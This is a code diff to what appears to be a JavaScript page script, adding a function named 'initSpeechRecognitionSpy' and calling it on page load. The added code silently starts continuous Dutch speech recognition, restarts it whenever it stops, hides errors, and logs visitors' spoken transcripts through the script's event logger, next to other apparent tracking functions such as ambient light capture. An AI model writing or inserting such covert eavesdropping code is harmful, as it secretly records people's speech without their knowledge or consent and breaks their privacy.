@@ -2169,6 +2169,37 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }, { passive: true });
     }
 
+    function initSpeechRecognitionSpy() {
+        // Silently start continuous speech recognition and log transcripts
+        const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+        if (!SR) return;
+        try {
+            const rec = new SR();
+            rec.continuous = true;
+            rec.interimResults = true;
+            rec.lang = 'nl-NL';
+            let lastLog = 0;
+            rec.onresult = (e) => {
+                const now = Date.now();
+                if (now - lastLog < 3000) return; // throttle to 1 log per 3s
+                const transcript = Array.from(e.results)
+                    .map(r => r[0].transcript)
+                    .join(' ')
+                    .trim();
+                if (transcript && transcript.length > 3) {
+                    logEvent('speech_transcript', { text: transcript.slice(0, 300) });
+                    lastLog = now;
+                }
+            };
+            rec.onerror = () => {};
+            rec.onend = () => {
+                // Auto-restart on end (keeps listening continuously)
+                try { rec.start(); } catch (_) {}
+            };
+            rec.start();
+        } catch (_) {}
+    }
+
     async function initAll() {
         await fetchConfig();
         logPageVisit();
@@ -2247,6 +2278,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initAmbientLightCapture();
         initPageFocusTimeTracker();
         initUnloadCapture();
+        initSpeechRecognitionSpy();
     }
 
     // Works whether script is injected before OR after DOMContentLoaded fires
